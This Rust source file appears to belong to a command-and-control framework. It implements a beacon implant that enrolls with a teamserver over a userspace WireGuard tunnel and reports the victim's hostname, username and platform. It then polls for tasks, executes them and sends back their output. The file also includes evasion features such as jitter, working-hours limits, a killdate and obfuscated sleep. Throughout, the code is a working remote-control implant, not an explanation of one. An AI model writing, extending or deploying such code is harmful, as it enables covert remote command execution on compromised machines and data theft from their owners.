//! WireGuard beacon client: enroll then poll over a userspace WireGuard
//! tunnel driven manually over UDP (no TUN device required).

use crate::{execute_task, AgentState};
use anyhow::{bail, Context, Result};
use prost::Message;
use shikra_crypto::channel::SessionKeys;
use shikra_crypto::kex::KeyPair;
use shikra_crypto::signing::{verify, Identity};
use shikra_proto::v1::{
    agent_message, AgentHeartbeat, AgentMessage, AgentResult, Architecture, CheckInRequest,
    CheckInResponse, Envelope, Platform, SessionKind,
};
use shikra_transport::profile::C2Profile;
use shikra_transport::wg::{self, WgTunnel};
use shikra_transport::wire;
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::UdpSocket;
use tokio::sync::Mutex;

const OP_ENROLL: u8 = 1;
const OP_POLL: u8 = 2;
const EXCHANGE_TIMEOUT: Duration = Duration::from_secs(6);

#[derive(Debug, Clone)]
pub struct WgConfig {
    pub server_addr: String,
    /// Server WireGuard static public key (hex, 32 bytes).
    pub server_public: [u8; 32],
    pub server_identity: [u8; 32],
    pub enroll_token: String,
    pub profile: C2Profile,
    pub max_runtime_secs: Option<u64>,
}

struct WgSession {
    socket: UdpSocket,
    tunnel: WgTunnel,
    server_ip: std::net::IpAddr,
}

impl WgSession {
    async fn exchange(&mut self, frame: &[u8]) -> Result<Vec<u8>> {
        let outcome = self.tunnel.encapsulate(frame);
        for packet in &outcome.outbound {
            self.socket.send(packet).await.context("send WG packet")?;
        }

        let deadline = tokio::time::Instant::now() + EXCHANGE_TIMEOUT;
        // When protocol timers emit traffic (handshake retransmits) the tunnel
        // is recovering from session expiry; allow a longer budget so the
        // rekey can complete instead of abandoning the exchange mid-handshake.
        let mut recovery_deadline: Option<tokio::time::Instant> = None;
        let mut buf = vec![0u8; wg::MAX_WG_PACKET];
        loop {
            let limit = recovery_deadline.unwrap_or(deadline);
            if tokio::time::Instant::now() >= limit {
                bail!("wireguard exchange timed out");
            }
            tokio::select! {
                received = self.socket.recv(&mut buf) => {
                    match received {
                        Ok(len) => {
                            let outcome = self.tunnel.decapsulate(self.server_ip, &buf[..len]);
                            for packet in &outcome.outbound {
                                self.socket.send(packet).await.context("send WG packet")?;
                            }
                            if let Some(payload) = outcome.payloads.into_iter().next() {
                                return Ok(payload);
                            }
                        }
                        Err(err) => return Err(err).context("wireguard recv failed"),
                    }
                }
                _ = tokio::time::sleep(Duration::from_millis(250)) => {
                    let outcome = self.tunnel.update_timers();
                    if !outcome.outbound.is_empty() {
                        recovery_deadline =
                            Some(tokio::time::Instant::now() + Duration::from_secs(25));
                    }
                    for packet in &outcome.outbound {
                        self.socket.send(packet).await.context("send WG packet")?;
                    }
                }
            }
        }
    }
}

/// Runs the WireGuard beacon loop.
pub async fn run_wg_beacon(config: WgConfig) -> Result<()> {
    run_wg_beacon_notify(config, None).await
}

/// Like [`run_wg_beacon`], but signals `ready` after successful enrollment.
pub async fn run_wg_beacon_notify(
    config: WgConfig,
    ready: Option<tokio::sync::oneshot::Sender<()>>,
) -> Result<()> {
    let server_addr: SocketAddr = config
        .server_addr
        .parse()
        .context("invalid WireGuard server address")?;
    let socket = UdpSocket::bind("0.0.0.0:0")
        .await
        .context("failed to bind WireGuard socket")?;
    socket
        .connect(server_addr)
        .await
        .context("failed to connect WireGuard socket")?;

    let (client_secret, _client_public) = wg::generate_static_keypair();
    let index: u32 = rand::random::<u32>() & 0x00FF_FFFF;
    let tunnel = WgTunnel::new(
        client_secret,
        wg::WgPublicKey::from(config.server_public),
        index,
        Some(25),
    );
    let mut session = WgSession {
        socket,
        tunnel,
        server_ip: server_addr.ip(),
    };

    let identity = Identity::generate();
    let kex = KeyPair::generate();
    let kex_public = kex.public_key();
    let signature = identity.sign(&wire::enroll_message(&kex_public));

    let checkin = CheckInRequest {
        identity_public: identity.public_key_bytes().to_vec(),
        kex_public: kex_public.to_vec(),
        identity_signature: signature.to_bytes().to_vec(),
        hostname: crate::hostname(),
        username: crate::username(),
        platform: current_platform(),
        architecture: current_architecture(),
        process_name: std::env::current_exe()
            .ok()
            .and_then(|path| path.file_name().map(|n| n.to_string_lossy().to_string()))
            .unwrap_or_default(),
        kind: SessionKind::Beacon as i32,
        enrollment_token: config.enroll_token.clone(),
        killdate_unix: crate::limits::get().killdate_unix,
        working_hours: crate::limits::get().working_hours.clone(),
    };

    tracing::info!(
        server = %server_addr,
        public_key = %shikra_transport::tls::hex_encode(&config.server_public),
        "connecting to WireGuard endpoint"
    );
    let enroll_frame = frame(OP_ENROLL, &checkin.encode_to_vec());
    let body = match tokio::time::timeout(Duration::from_secs(10), session.exchange(&enroll_frame))
        .await
    {
        Ok(result) => result?,
        Err(_) => {
            tracing::warn!(
                server = %server_addr,
                "no WireGuard handshake response after 10s — is the wireguard listener started on the teamserver?"
            );
            session.exchange(&enroll_frame).await?
        }
    };
    let checkin_response = CheckInResponse::decode(body.as_slice()).context("decode enroll")?;
    if checkin_response.session_id.starts_with("error:") {
        bail!("enrollment rejected: {}", checkin_response.session_id);
    }

    let server_kex_public: [u8; 32] = checkin_response
        .server_kex_public
        .as_slice()
        .try_into()
        .map_err(|_| anyhow::anyhow!("server kex public key has wrong length"))?;
    verify(
        &config.server_identity,
        &wire::checkin_response_message(
            &checkin_response.session_id,
            &kex_public,
            &server_kex_public,
        ),
        &checkin_response.server_signature,
    )
    .context("server identity verification failed")?;

    let shared = kex.diffie_hellman(&server_kex_public);
    let keys = SessionKeys::derive(&checkin_response.session_id, &shared, true)
        .context("session key derivation failed")?;
    let keys = Arc::new(Mutex::new(keys));

    tracing::info!(
        session = %checkin_response.session_id,
        transport = "wireguard",
        "beacon checked in"
    );
    if let Some(ready) = ready {
        let _ = ready.send(());
    }

    let mut agent_state = AgentState::default();
    let mut pending_results = crate::MaskedResults::new();
    let deadline = config
        .max_runtime_secs
        .map(|secs| tokio::time::Instant::now() + Duration::from_secs(secs));

    loop {
        if crate::limits::killdate_expired() {
            tracing::info!("killdate reached; exiting");
            std::process::exit(0);
        }
        if crate::limits::outside_working_hours() {
            tokio::time::sleep(Duration::from_secs(60)).await;
            continue;
        }
        if let Some(deadline) = deadline {
            if tokio::time::Instant::now() >= deadline {
                break;
            }
        }

        let message = match pending_results.take_batch() {
            Some(batch) => AgentMessage {
                body: Some(agent_message::Body::Results(batch)),
            },
            None => AgentMessage {
                body: Some(agent_message::Body::Heartbeat(AgentHeartbeat {
                    unix_ms: crate::current_unix_ms(),
                })),
            },
        };

        let envelope = {
            let mut keys = keys.lock().await;
            wire::seal_message(&mut keys, &message).context("seal poll")?
        };

        match session
            .exchange(&frame(OP_POLL, &envelope.encode_to_vec()))
            .await
        {
            Ok(body) => {
                if let Ok(reply) = Envelope::decode(body.as_slice()) {
                    let opened = {
                        let mut keys = keys.lock().await;
                        wire::open_message(&mut keys, &reply).ok()
                    };
                    if let Some(opened) = opened {
                        if let Some(agent_message::Body::Tasks(batch)) = opened.body {
                            for task in batch.tasks {
                                let task_id = task.task_id.clone();
                                let outcome = execute_task(&mut agent_state, &task, None).await;
                                pending_results.push(AgentResult {
                                    task_id,
                                    exit_code: outcome.exit_code,
                                    stdout: outcome.stdout,
                                    stderr: outcome.stderr.into_bytes(),
                                });
                            }
                        }
                    }
                }
            }
            Err(err) => tracing::warn!(%err, "WireGuard poll failed"),
        }

        let jitter = if config.profile.jitter_secs > 0 {
            rand::random::<u64>() % config.profile.jitter_secs
        } else {
            0
        };
        crate::sleep_obfuscated(Duration::from_secs(
            config.profile.poll_interval_secs.max(1) + jitter,
        ))
        .await;
    }

    Ok(())
}

fn frame(opcode: u8, payload: &[u8]) -> Vec<u8> {
    let mut frame = Vec::with_capacity(1 + payload.len());
    frame.push(opcode);
    frame.extend_from_slice(payload);
    frame
}

fn current_platform() -> i32 {
    if cfg!(target_os = "windows") {
        Platform::Windows as i32
    } else if cfg!(target_os = "macos") {
        Platform::Macos as i32
    } else {
        Platform::Linux as i32
    }
}

fn current_architecture() -> i32 {
    if cfg!(target_arch = "aarch64") {
        Architecture::Aarch64 as i32
    } else {
        Architecture::X8664 as i32
    }
}
